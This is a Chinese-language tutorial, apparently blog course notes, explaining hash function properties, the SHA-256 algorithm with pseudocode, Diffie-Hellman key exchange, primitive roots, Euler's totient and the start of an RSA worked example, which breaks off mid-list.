<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233988.png" alt="img"></p>
</blockquote>
<p>   抗冲突的应用:</p>
<blockquote>
<p>抗冲突的一个主要应用是信息摘要（message digest）。</p>
<p>对于抗冲突性的哈希函数而言，如果两个输入x和y不同，那么就可以认为H(x)和H(y)不同——否则的话，就违反了抗冲突性。</p>
<p>这个性质就可以做信息摘要。考虑2015年的xcode后门事件，因为国内的开发者从苹果官网下载xcode开发框架速度太慢，所以一些公司的开发人员直接从百度云上下载了某些人“好心”提供的版本。腾讯的安全实验发现很多app出现异常流量后发现源头在于使用的xcode，即使开发人员本身写的代码是正确的，经过篡改的xcode可以将恶意代码链入到app中。所以带来的一个问题是，当我们下载开源的软件使用时，怎么可以保证下载到的软件是官方的而不是经过第三方恶意修改过的呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233990.jpg" alt="v2-307e48ac17cd19c71201191f50eb24af_1440w"></p>
<p>这是mysql的下载页面，可以看到在提供下载链接的同时，提供了MD5散列摘要。如果想要保证安全，可以在第三方下载软件之后，使用同样的算法做一次散列，如果相同，可以放心使用。</p>
</blockquote>
<h3 id="Hiding"><a href="#Hiding" class="headerlink" title="Hiding"></a>Hiding</h3><p><strong>Hiding的意思是如果有哈希函数的输出y，那么不可能找到x，使得h(x)&#x3D;y。</strong></p>
<p>关于hiding的含义前面已经解释过。现在的一个问题是，如果输入值本身是有限的，譬如在一个掷硬币的游戏中，如果扔出来head，那么就计算“head”的哈希值；如果扔出来tail，那么就计算”tail”的哈希值。那么在一次投掷过后，公布哈希值，能知道这次投掷的结果吗？</p>
<p>这个问题的特点是输入值的空间太小，如果想要知道输入是什么，只需要遍历一遍，把所有可能的值计算一下，然后进行比对就行。譬如在这里，只需要算两个值，那么肯定可以知道投掷的结果。所以也就失去了hiding的特点。</p>
<p>如果想对head&#x2F;tail的结果进行隐藏，有什么办法吗？</p>
<p>答案就是通过对简单的”head”和”tail”后面跟上一个随机性较强的串r，这样就能实现hiding。譬如，后面跟上长度为256bit的串，这样因为r的随机性足够强，即使head和tail很简单，也有足够的隐藏性。</p>
<p>hiding的应用:</p>
<blockquote>
<p>commitment（承诺）。承诺的场景，譬如，世界杯预测结果，每个人都把自己预测结果放在信封里，并且封上信封，放在桌上。这相当于做出了一个承诺。然后世界杯结束后，大家拆开信封，看看当初谁预测得最准确。</p>
<p>在密码学中，可以这样计算：</p>
<p>com :&#x3D; commit(msg, nonce), nonce是一个随机的秘密的数字（譬如256位）；然后公开com；相当于把公布了一个密封的信封；大家都知道做出了承诺，但是具体值是什么还没有公开</p>
<p>verify(com,msg,nonce)，如果要检验，则用户提供原始的msg和nonce，通过同样的方法计算，看com是否和commit计算出来的结果相同</p>
<p>（考虑一下，为什么需要一个Nonce？）</p>
<p>这里的commit就可以使用哈希函数来实现。</p>
</blockquote>
<h3 id="puzzle-friendliness"><a href="#puzzle-friendliness" class="headerlink" title="puzzle friendliness"></a>puzzle friendliness</h3><p>对于每一个可能的 n位输出 $y$,如果 $k$是随机性很强的值（譬如长度为256位的随机二进制串），那么找到一个合适的 $x$使得  $H(k||x)&#x3D;y$ 是不可能显著地低于  $2^n$的时间复杂度。</p>
<p>这个特点强调的是，如果给定特殊的哈希结果 $y$，并且输入中有一部分随机性很强的$k$，那么找到输入的另一个部分 $x$ 使得哈希的结果等于$y$，那么就只能依靠暴力搜索。</p>
<p>应用： search puzzle ；区块链中的工作量证明。</p>
<h2 id="哈希算法SHA-256"><a href="#哈希算法SHA-256" class="headerlink" title="哈希算法SHA-$256$"></a>哈希算法SHA-$256$</h2><ol>
<li>512-448 &#x3D; 64  字符串长度限定$2^{64}$, data + 1 + n个0 &#x3D; 448mod512,例如data有440bits,则补一个1,然后补7个零;data有952bits,则补一个1,然后补7个零;data有448bits,则补一个1,然后补511个0;data447bits,则补一个1,不用补0.最后一个块剩下64位,就是$2^x$ &#x3D; len(data),例如data位512bits,则最后64位为0x 0000000000000009</li>
<li>把512bits拆成16*32bits,扩展成64个32bits的w(w[i] :&#x3D; w[i-16] + s0 + w[i-7] + s1),k是64个常量(这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。)</li>
<li>第一轮有8个初始hash值(8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数),然后对这64个无符号型整数进行hash加密,加密64轮,然后会得到8个hash值,这8个hash值作为下一轮的输入.</li>
</ol>
<p>SHA-256是SHA-2中的一个算法。SHA-2，也即第二代安全散列算法（Secure Hash Algorithm 2），由美国国家安全局2001年公布的标准哈希算法，是SHA-1的后继。</p>
<p>SHA-2下包括六个不同的算法标准：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512&#x2F;224、SHA-512&#x2F;256。这些不同的算法使用不同生成摘要的长度 、循环运行的次数，但算法的基本结构是一致的。现在已知SHA-2容易受到长度扩展攻击，所以推荐使用SHA-3来取代它。</p>
<p>对于任意长度的消息，SHA256都产生256bit长的哈希值，也即32字节，或者64位的16进制数，或者8个8位的16机制数 。:)</p>
<p>SHA-256的计算过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233991.jpg" alt="preview"></p>
<p align="center">来自wiki,SHA2的一轮计算</p>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233992.jpg" alt="img"></p>
<p>这里A～H共有8个，初始值分别是</p>
<p>h0 :&#x3D; 0x6a09e667<br>h1 :&#x3D; 0xbb67ae85<br>h2 :&#x3D; 0x3c6ef372<br>h3 :&#x3D; 0xa54ff53a<br>h4 :&#x3D; 0x510e527f<br>h5 :&#x3D; 0x9b05688c<br>h6 :&#x3D; 0x1f83d9ab<br>h7 :&#x3D; 0x5be0cd19</p>
<p>看一下，分别是8个16进制数，所以总共有256位，这个就叫做初始向量（IV）。这8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数。最终生成的哈希值也是这么长，所以，每一轮的计算就是如上图所示，更新这8个值。</p>
<p>那怎么更新呢？</p>
<p><strong>每一轮计算64次。</strong>在上图中可以看到，除了A～H外，有两个输入，分别是 $w_t$和$k_t$ 。也即每一轮中有64个 $w$，以及64个 $k$ 。每个 $w$度为32bit，也即4个字节。64个 $w$来自于哈希函数的输入，也即，对于输入，不论长短，长的就分成每512bit一个块（64个字节），短的补足512bit。这64个字节构成了前16个 $w$,后面的48个 $w$过前面的16个生成。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i from <span class="number">16</span> to <span class="number">63</span></span><br><span class="line">        s0 := (w[i<span class="number">-15</span>] rightrotate <span class="number">7</span>) xor (w[i<span class="number">-15</span>] rightrotate <span class="number">18</span>) xor (w[i<span class="number">-15</span>] rightshift <span class="number">3</span>)</span><br><span class="line">        s1 := (w[i<span class="number">-2</span>] rightrotate <span class="number">17</span>) xor (w[i<span class="number">-2</span>] rightrotate <span class="number">19</span>) xor (w[i<span class="number">-2</span>] rightshift <span class="number">10</span>)</span><br><span class="line">        w[i] := w[i<span class="number">-16</span>] + s0 + w[i<span class="number">-7</span>] + s1</span><br></pre></td></tr></table></figure>



<p><strong>64个 $k$是64个常量</strong>，</p>
<p>k[0..63] :&#x3D;<br>0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,<br>0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,<br>0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</p>
<p>这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。</p>
<p>然后每一次的计算，</p>
<p>h :&#x3D; g<br>g :&#x3D; f<br>f :&#x3D; e<br>e :&#x3D; d <strong>+</strong> temp1<br>d :&#x3D; c<br>c :&#x3D; b<br>b :&#x3D; a<br>a :&#x3D; temp1 <strong>+</strong> temp2</p>
<p>可以看下伪代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize variables</span><br><span class="line">(first 32 bits of the fractional parts of the square roots of the first 8 primes 2..19):</span><br><span class="line">h0 := 0x6a09e667</span><br><span class="line">h1 := 0xbb67ae85</span><br><span class="line">h2 := 0x3c6ef372</span><br><span class="line">h3 := 0xa54ff53a</span><br><span class="line">h4 := 0x510e527f</span><br><span class="line">h5 := 0x9b05688c</span><br><span class="line">h6 := 0x1f83d9ab</span><br><span class="line">h7 := 0x5be0cd19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize table of round constants</span><br><span class="line">(first 32 bits of the fractional parts of the cube roots of the first 64 primes 2..311):</span><br><span class="line">k[0..63] :=</span><br><span class="line">   0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">   0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">   0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">   0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">   0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">   0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">   0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">   0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[0..15]</span><br><span class="line"></span><br><span class="line">    Extend the sixteen 32-bit words into sixty-four 32-bit words:</span><br><span class="line">    for i from 16 to 63</span><br><span class="line">        s0 := (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor(w[i-15] rightshift 3)</span><br><span class="line">        s1 := (w[i-2] rightrotate 17) xor (w[i-2] rightrotate 19) xor(w[i-2] rightshift 10)</span><br><span class="line">        w[i] := w[i-16] + s0 + w[i-7] + s1</span><br><span class="line"></span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    f := h5</span><br><span class="line">    g := h6</span><br><span class="line">    h := h7</span><br><span class="line"></span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 63</span><br><span class="line">        s0 := (a rightrotate 2) xor (a rightrotate 13) xor(a rightrotate 22)</span><br><span class="line">        maj := (a and b) xor (a and c) xor(b and c)</span><br><span class="line">        t2 := s0 + maj</span><br><span class="line">        s1 := (e rightrotate 6) xor (e rightrotate 11) xor(e rightrotate 25)</span><br><span class="line">        ch := (e and f) xor ((not e) and g)</span><br><span class="line">        t1 := h + s1 + ch + k[i] + w[i]</span><br><span class="line">        h := g</span><br><span class="line">        g := f</span><br><span class="line">        f := e</span><br><span class="line">        e := d + t1</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := a</span><br><span class="line">        a := t1 + t2</span><br><span class="line"></span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">    h5 := h5 + f</span><br><span class="line">    h6 := h6 + g</span><br><span class="line">    h7 := h7 + h</span><br><span class="line"></span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4 append h5 append h6 append h7</span><br></pre></td></tr></table></figure>

<p>关于短的输入如何补足也有一些细节，在输入末尾进行填充，使输入长度在对512取模以后的余数是448。填充的具体过程：先补第一个比特为1，然后都补0，直到长度满足对512取模后余数是448。需要注意的是，信息必须进行填充，也就是说，即使长度已经满足对512取模后余数是448，补位也必须要进行，这时要填充512个比特。因此，填充是至少补一位，最多补512位。为什么余数是448呢?因为，还有需要有64位的数据表示原始输入的长度，加上这64bit的长度信息448+64&#x3D;512，刚好512位。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233993.jpg" alt="preview">Merkle-Damgard构造</p>
<p><strong>在区块链中的应用</strong></p>
<p>哈希在区块链中的用处包括：</p>
<ol>
<li>利用puzzle-friendliness的工作量证明，也即，要求生成一个新区块时，哈希值一定要是以一定数量的连续的0开始的；</li>
<li>对每个区块的内容进行哈希，后面的区块相当于一直在对前面的区块进行哈希，所以一般来说，如果一个区块之后如果跟上其他6个区块之后，一般认为该区块的内容已经被公认了，不可更改。</li>
</ol>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Block_hashing_algorithm">Block hashing algorithm</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=https://lopp.net/pdf/princeton_bitcoin_book.pdf">https://lopp.net/pdf/princeton_bitcoin_book.pdf</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/SHA-2">SHA-2 - Wikipedia</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011583927/article/details/80905740">SHA256算法原理详解 - CSDN博客</a></p>
<h1 id="区块链技术4-密码学指非对称加密"><a href="#区块链技术4-密码学指非对称加密" class="headerlink" title="区块链技术4:密码学指非对称加密"></a>区块链技术4:密码学指非对称加密</h1><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>对称密钥的问题主要在于：</p>
<ol>
<li>共同的密钥的协商。直接的面对面协商可能是不现实的，而任何其他方法都有可能泄露；</li>
<li>密钥的管理。最好对于每个用户的每次通信都使用不同的密钥；</li>
<li>对称加密算法不能提供身份验证，而在电子商务中，用户必须要确认自己隐私数据的接收方是真正的网站；</li>
</ol>
<h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>非对称加密的发展起源于1976年的Diffie-Hellman密钥交换算法。DH实际上并不是一种加密协议，它可以让双方在完全没有对方任何预先信息的条件下通过不安全的信道就密钥达成一致，这个密钥可以在后续的通信中作为对称密钥来加密。</p>
<p>DH算法过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233994.jpg" alt="preview"></p>
<p>DH协商过程，Alice和Bob首先挑选一个颜色（黄色），这个颜色是可以公开的（每次通信不同）；然后再各自挑选一个秘密的颜色（Alice橙色，Bob青色）。然后Alice和Bob各自将自己的秘密颜色和黄色进行混合，得到了另外的两个颜色（Alice橙褐色，Bob淡蓝色）。Alice和Bob分别将自己的颜色发给对方。Alice和Bob在收到对方发来的颜色后，再分别和自己的颜色相混合，此时，两人得到了一个相同的颜色（黄褐色）。</p>
<p>在这个过程中，攻击者Eve可以一直监听网络，并且获得Alice和Bob在网络上交换的所有信息。也即，可以获得黄色、橙褐色、淡蓝色这些信息。阻止Eve获得最终的黄褐色的是Alice和Bob分别挑选的秘密颜色，橙色和青色。也即，需要能够证明，即使Eve得到了黄色和橙褐色，Eve也不能推导出Alice的秘密颜色。</p>
<p>在数学上，DH算法的有效性依赖于计算离散对数的难度。也即，当已知大素数 $p$ 和它的一个原根（primitive root）$g$ ，对于给定的 $b$，要计算指数 $i$，是非常困难的（暴力破解），而给定$i$,计算$b$是非常容易的</p>
<p>再用一个具体的例子来解释DH:</p>
<ol>
<li><p>Alice和Bob通过交流,决定选择素数$p&#x3D;23$以及原根$g&#x3D;5$</p>
</li>
<li><p>Alice选择一个秘密整数$a&#x3D;4$,Bob选择一个秘密整数$b&#x3D;3$</p>
</li>
<li><p>Alice和Bob分别使用$p,g,a$和$b$计算出$A$和$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Alice和Bob分别将这两个数字$A&#x3D;4$和$B&#x3D;10$通过网络发送给对方。</p>
</li>
<li><p>Alice和Bob收到$B$和$A$之后，分别计算：</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>现在Alice和Bob拥有了一个共同的密钥18。而且这个密钥从来没有在网络上传输过</p>
</li>
</ol>
<p>为什么Alice和Bob可以获得共同的公钥呢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>那现在看一下，DH算法可以运行的关键是什么？</p>
<p>即使攻击者Eve可以获得23、5、$A$和$B$，她仍然不能得到Alice和Bob的秘密数字4和3。也即，即使知道 $5^3mod(23)&#x3D;10$这个计算过程中的底数5，模数23和结果10，她依然不能得到指数3。这个就是DH算法所依赖的计算离散对数的难度。（证明计算离散对数很难超纲）</p>
<p>当然我们这里所举的例子非常简单，在实际使用中，必须使用很大的  $p,a,b$。如果 $p$长度为300位，$a$和$b$ 长度为100位，那基本就安全了。</p>
<h4 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h4><p>如果a是素数<em>p</em>的一个原根，那么数值：</p>
<p><em>a</em>mod<em>p</em>，<em>a^2</em> mod<em>p</em>，…，<em>a^(p-1)</em> mod<em>p</em></p>
<p>是各不相同的整数，且以某种排列方式组成了从<em>1</em>到<em>p-1</em>的所有整数。</p>
<p>例子，3是7的原根。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233995.jpg" alt="img">来自wiki</p>
<p>反例：3不是13的原根。<br>$$<br>3^1mod13&#x3D;3<br>\3^2mod13&#x3D;6<br>\3^3mod13&#x3D;1<br>\3^4mod13&#x3D;3<br>\3^5mod13&#x3D;9<br>\3^6mod13&#x3D;1<br>\3^7mod13&#x3D;3<br>$$</p>
<h4 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h4><p>欧拉函数描述的问题是，<strong>任意给定正整数n，在小于等于n的正整数之中，有多少个与n构成互质关系？这个函数一般表示为</strong>$\varphi(n)$。</p>
<p><strong>欧拉函数的通式</strong>：$\varphi(n)&#x3D;n(1-1&#x2F;p1)(1-1&#x2F;p2)(1-1&#x2F;p3)(1-1&#x2F;p4)……(1-1&#x2F;pn)$</p>
<p>其中p1, p2……pn为n的所有质因数(10的质因数是2和5, 4的质因子只有2)，n是不为0的整数。$\varphi(1)&#x3D;1$（唯一和1互质的数就是1本身）。</p>
<p>​                                                   $\varphi(x)&#x3D;x\prod_{i&#x3D;1}^n(1-\frac{1}{p_i})$</p>
<p>$\varphi(10)&#x3D;4$,      因为1,3,7,9和10互质</p>
<p>设m是正整数，a是整数，若a模m的阶等于$\varphi(m)$，则称a为模m的一个原根。对于(a,m)&#x3D;1的整数，满足a^r≡1 (mod m ) 的最小整数r,称为a模m的阶。即$a^{\varphi(m)}\equiv1(modm)$</p>
<p>【m有原根的充要条件是$m&#x3D; 1,2,4,p,2p,p^n$，其中p是奇质数(除2以外的所有质数)，n是任意正整数；也即不是所有的数都有原根】</p>
<p>如果正整数m有原根，那么原根的个数为 $\varphi(\varphi(m))$</p>
<p>另外补充一下欧拉定理。如果整数$a$和$m$互质,那么$a^{\varphi(m)}\equiv1(modm)$ .费马小定理是欧拉定理当$m$ 是素数时的特例。（欧拉定理很有用，在后面RSA中还会出现。）</p>
<p>例1:n &#x3D; 23而言，原根的个数应该是<br>$$<br>\varphi(23)&#x3D;23*(1-\frac{1}{23})&#x3D;22 \<br>\varphi(\varphi(23))&#x3D;\varphi(22)&#x3D;22*(1-\frac{1}{2})*(1-\frac{1}{11})&#x3D;10<br>$$</p>
<p>可以很容易算出，从1~p-1的22个数中，</p>
<p>5, 7, 10, 11, 14, 15, 17, 19, 20, 21共10个数字是23的原根。</p>
<p>例2:n &#x3D; 13而言，原根的个数应该是<br>$$<br>\varphi(13)&#x3D;13*(1-\frac{1}{13})&#x3D;12 \<br>\varphi(\varphi(13))&#x3D;\varphi(12)&#x3D;12*(1-\frac{1}{2})*(1-\frac{1}{3})&#x3D;4<br>$$</p>
<p>可以很容易算出，从1~p-1的12个数中，</p>
<p>2 5 7 11是13的原根</p>
<p>所以这里有一个问题是，为什么在DH算法中，要强调使用的是原根？而不是和 $p$的任意数字？因为根据素数的特性，不论是不是原根，下面的等式总是成立的。</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>这里主要涉及的问题是，破解的难度。</p>
<p>如果使用的g不是p的原根,那么g的所有指数只能生成小于p的整数的一个子集.那么对于攻击者而言,此时即使是暴力破解,需要计算的也只是小于p的整数的子集,而不是小于p的整数全部.</p>
<p>譬如，对于素数13而言，3不是它的原根，(3^1&#x3D;3, 3^2&#x3D;9, 3^3&#x3D;1)mod（13），所以生成的模数只有3个（order），等效的指数也只有3个，降低了攻击者暴力破解的难度。</p>
<p>例如，在DH系统中，如果选择g&#x3D;3，Alice选择了 a&#x3D;7那么对于攻击者Eve而言，本来她需要尝试到7（遍历小于13的全部数字）才能得到 $3^7mod(13)&#x3D;3$；但是实际上，Eve只需要知道 $3^1mod(13)&#x3D;3$就足够了。因为最终的$s&#x3D;[g^{ab}&#x3D;g^{7*b}&#x3D;(g^1)^b]mod(13)$</p>
<p>所以大大降低了DH算法的破解难度。</p>
<p>另外，还需要注意一点，DH算法并没有对双方身份进行验证。当Alice和Bob希望进行通信时，Eve可以很容易地向Alice冒充自己是Bob，以及向Bob冒充自己是Alice，然后分别和Alice和Bob建立公共的对称密钥。然后，Alice到Bob的通信都会通过Eve先使用自己与Alice建立的密钥先解密，获得明文信息之后，再用Eve与Bob建立的密钥加密，传给Bob。Bob到Alice的通信亦然。这样，Alice和Bob会以为自己和对方的通信是加密的，从而是安全的，但是它们的通信会经过Eve加解密一遍。Eve在Alice和Bob之间，拦截他们的通信，并且维持通信，就称为中间人攻击。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233996.jpg" alt="img"></p>
<p>为了防御中间人攻击，就需要一个能够验证通信双方身份的机制来防止这种攻击。</p>
<hr>
<p>补充， $\varphi(n)$的计算.举例来说,$\varphi(10)$计算的是不超过10的自然数中与10互质的数的个数。因为10&#x3D;2*5，也即不超过10的自然数中，所有2的倍数，以及所有5的倍数都不与10互质。所以可以通过减去2的倍数的个数、5的倍数的个数，以及根据容斥原理，再加上同时是2和5的倍数的数字的个数，就可以算出来不超过10的自然数中与10互质的数字的个数。也即，</p>
<p>$10-(10\div2)-(10\div5)+(10\div(2\times5))&#x3D;4$</p>
<p>上面的式子可以改写成：</p>
<p>$10\times(1-\frac{1}{2})\times(1-\frac{1}{5})&#x3D;4$</p>
<p>上面的式子可以进一步理解为：</p>
<p>$\varphi(10)&#x3D;\varphi(2\times5)&#x3D;\varphi(2)\times\varphi(5)$</p>
<p>上面的公式是不是可以扩展为：</p>
<p>$\varphi(p\times q)&#x3D;\varphi(p)\times\varphi(q)$？</p>
<p>上述结论在p 和q没有共同公因子的情况下是可以成立的。但是在p和q共同公因子的情况下则有问题。譬如考虑 $\varphi(8)$的情况。不大于8的自然数中与8互质的数就是去除所有2的倍数的数。因此，</p>
<p>$\varphi(8)&#x3D;8-8\div2&#x3D;8\times(1-\frac{1}{2})$</p>
<p>在上面的计算中，虽然 $8&#x3D;2^3$ ，但是$\varphi(8)$  的计算与次幂无关。因此，如果将8进行分解，譬如，分解成</p>
<p>$\varphi(8)&#x3D;\varphi(2\times4)&#x3D;\varphi(2)*\varphi(4)$</p>
<p>是有问题的。相当于多乘了1&#x2F;2。也即，在质因子有幂乘的情况下，不能将质因子分解到两个乘数中去。这样看来，如果计算$\varphi(100)$，不能将100分解成$10<em>10$，而应该分解为$4</em>25$。这样计算得出</p>
<p>$$\varphi(100)&#x3D;\varphi(4)<em>\varphi(25)&#x3D;2</em>20&#x3D;40$$</p>
<p>同时，$\varphi(p^n)&#x3D;p^n\times(1-\frac{1}{p}&#x3D;p^{n-1}*(p-1))$也可以便于计算。</p>
<h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<br>假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。<br>只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
<h4 id="RSA过程的具体例子"><a href="#RSA过程的具体例子" class="headerlink" title="RSA过程的具体例子"></a>RSA过程的具体例子</h4><ol>
<li><p>挑选两个质数，如 $p&#x3D;61,q&#x3D;53$</p>
</li>
<li><p>计算$n&#x3D;p*q&#x3D;3233$</p>
</li>
<li><p>计算$\varphi(n)&#x3D;\varphi(p)<em>\varphi(q)&#x3D;(p-1)</em>(q-1)&#x3D;3120$【这一步可以计算（p-1）和（q-1）的最小公倍数，从而使得计算的d比较小；17关于780的模逆是413，比2753要小】</p>
</li>
